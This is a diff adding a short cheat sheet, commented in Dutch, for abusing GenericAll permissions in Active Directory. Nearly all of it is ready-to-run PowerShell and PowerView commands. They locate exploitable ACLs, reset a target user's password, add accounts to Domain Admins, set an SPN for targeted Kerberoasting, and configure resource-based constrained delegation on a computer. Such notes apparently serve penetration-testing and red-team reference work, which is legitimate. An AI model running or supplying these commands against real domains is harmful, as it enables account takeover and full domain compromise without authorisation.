@@ -1,0 +1,17 @@
+# GenericAll Abuse - Volledige controle over AD object
+# Stap 1: Vind objecten waar je GenericAll op hebt
+powershell -c "Import-Module .\PowerView.ps1; Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.ActiveDirectoryRights -match 'GenericAll' -and $_.IdentityReferenceName -match 'currentuser'}"
+# === Op een USER ===
+# Wachtwoord resetten:
+Set-DomainUserPassword -Identity targetuser -AccountPassword (ConvertTo-SecureString 'Password123!' -AsPlainText -Force) -Verbose
+# Toevoegen aan groep:
+Add-DomainGroupMember -Identity 'Domain Admins' -Members targetuser -Verbose
+# Targeted Kerberoast (SPN zetten):
+Set-DomainObject -Identity targetuser -Set @{serviceprincipalname='domain/whatever1'}
+# === Op een GROEP ===
+# Jezelf toevoegen:
+Add-DomainGroupMember -Identity 'Domain Admins' -Members currentuser -Verbose
+# === Op een COMPUTER ===
+# RBCD configureren:
+Set-ADComputer target$ -PrincipalsAllowedToDelegateToAccount YOURPC$
+# Tip: GenericAll = volledige controle, GenericWrite = properties schrijven
